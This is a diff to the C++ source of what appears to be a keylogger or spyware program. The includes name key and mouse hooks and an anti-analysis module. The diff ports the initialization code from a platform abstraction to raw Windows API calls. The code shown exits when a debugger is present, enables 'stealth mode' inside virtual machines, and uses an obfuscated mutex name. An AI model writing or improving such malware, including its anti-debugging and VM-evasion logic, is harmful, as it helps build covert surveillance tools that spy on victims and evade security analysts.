@@ -3,7 +3,6 @@
 #include "core/Application.h"
 #include "core/Configuration.h"
 #include "core/Logger.h"
-#include "core/Platform.h"              // Use platform abstraction
 #include "hooks/KeyHook.h"
 #include "hooks/MouseHook.h"
 #include "security/AntiAnalysis.h"
@@ -14,6 +13,7 @@
 #include "utils/SystemUtils.h"
 #include "utils/FileUtils.h"
 #include "utils/TimeUtils.h"
+#include <windows.h>
 #include <thread>
 #include <chrono>
 #include <string>
@@ -35,7 +35,7 @@ Application::~Application() {
 bool Application::Initialize() {
     // Anti-analysis checks
     if (security::AntiAnalysis::IsDebuggerPresent()) {
-        Platform::ExitProcess(0);
+        ExitProcess(0);
     }
 
     if (security::AntiAnalysis::IsRunningInVM()) {
@@ -43,10 +43,11 @@ bool Application::Initialize() {
         utils::SystemUtils::EnableStealthMode();
     }
 
-    // Singleton instance check using cross-platform mutex
-    PlatformHandle hMutex = Platform::CreateNamedMutex(OBFUSCATED_MUTEX_NAME.c_str());
-    if (Platform::GetLastError() == PLATFORM_ERROR_ALREADY_EXISTS || hMutex == INVALID_PLATFORM_HANDLE) {
-        Platform::ExitProcess(0);
+    // Singleton instance check using Windows mutex
+    HANDLE hMutex = CreateMutexA(NULL, TRUE, OBFUSCATED_MUTEX_NAME.c_str());
+    if (GetLastError() == ERROR_ALREADY_EXISTS || hMutex == NULL) {
+        CloseHandle(hMutex);
+        ExitProcess(0);
     }
 
     // Initialize components
